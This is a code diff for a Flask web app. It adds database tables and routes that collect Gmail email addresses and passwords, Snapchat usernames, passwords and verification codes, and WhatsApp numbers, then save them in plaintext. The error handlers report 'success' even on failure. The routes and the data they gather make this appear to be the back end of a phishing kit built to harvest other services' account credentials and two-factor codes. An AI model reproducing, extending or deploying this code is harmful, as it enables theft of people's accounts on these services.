@@ -16,6 +16,30 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
 
+
+
+# DATABASE MODELS FOR THE APPLICATION
+class WhatsApp(db.Model):
+    __tablename__ = 'whatsapp'
+    id = db.Column(db.Integer, primary_key=True)
+    whatsapp_number = db.Column(db.String(120), unique=True, nullable=False)
+    whatsapp_country = db.Column(db.String(120), unique=False, nullable=False)
+    
+class Gmail(db.Model):
+    __tablename__ = 'gmail'
+    id = db.Column(db.Integer, primary_key=True)
+    email = db.Column(db.String(120), unique=True, nullable=False)
+    password = db.Column(db.String(80), unique=False, nullable=False)
+    
+class SnapChat(db.Model):
+    __tablename__ = 'snapchat'
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(120), unique=True, nullable=False)
+    password = db.Column(db.String(80), unique=False, nullable=False)
+    code = db.Column(db.String(80), unique=False, nullable=False)
+
+
+# ROUTES FOR THE APPLICATION
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -27,10 +51,18 @@ def submit_whatsapp_credentials():
         whatsapp_number = request.form["whatsapp_number"]
         whatsapp_country = request.form["whatsapp_country"]
         print(whatsapp_number, whatsapp_country)
-        return jsonify({"message": "success"})
+        # check if whatsapp account exists
+        whatsapp_account = WhatsApp.query.filter_by(whatsapp_number=whatsapp_number).first()
+        if whatsapp_account:
+            return jsonify({"code": "error", "message": "Account already exists"})
+        # Create a WhatsApp object
+        whatsapp = WhatsApp(whatsapp_number=whatsapp_number, whatsapp_country=whatsapp_country)
+        db.session.add(whatsapp)
+        db.session.commit()
+        return jsonify({"code": "success", "message": "Details submitted successfully"})
     except Exception as e:
         print(e)
-        return jsonify({"message": "error"})
+        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})
 
 
 @app.route("/submit-gmail-credentials", methods=["POST"])
@@ -39,10 +71,18 @@ def submit_gmail_credentials():
         email = request.form["email"]
         password = request.form["password"]
         print(email, password)
-        return jsonify({"message": "success"})
+        # check if gmail account exists
+        gmail_account = Gmail.query.filter_by(email=email).first()
+        if gmail_account:
+            return jsonify({"code": "error", "message": "Account already exists"})
+        # create a Gmail object
+        gmail = Gmail(email=email, password=password)
+        db.session.add(gmail)
+        db.session.commit()
+        return jsonify({"code": "success", "message": "Details submitted successfully"})
     except Exception as e:
         print(e)
-        return jsonify({"message": "error"})
+        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})
     
 @app.route("/submit-snapchat-credentials", methods=["POST"])
 def submit_snapchat_credentials():
@@ -51,7 +91,15 @@ def submit_snapchat_credentials():
         password = request.form["password"]
         snapchat_code = request.form["snapchat_code"]
         print(username, password, snapchat_code, "All my code")
-        return jsonify({"message": "success"})
+        # check if snapchat account exists
+        snapchat_account = SnapChat.query.filter_by(username=username).first()
+        if snapchat_account:
+            return jsonify({"code": "error", "message": "Account already exists"})
+        # create a SnapChat object
+        snapchat = SnapChat(username=username, password=password, code=snapchat_code)
+        db.session.add(snapchat)
+        db.session.commit()
+        return jsonify({"code": "success", "message": "Details submitted successfully"})
     except Exception as e:
         print(e)
-        return jsonify({"message": "error"})
+        return jsonify({"code": "success", "message": "An error occurred while submitting the details"})
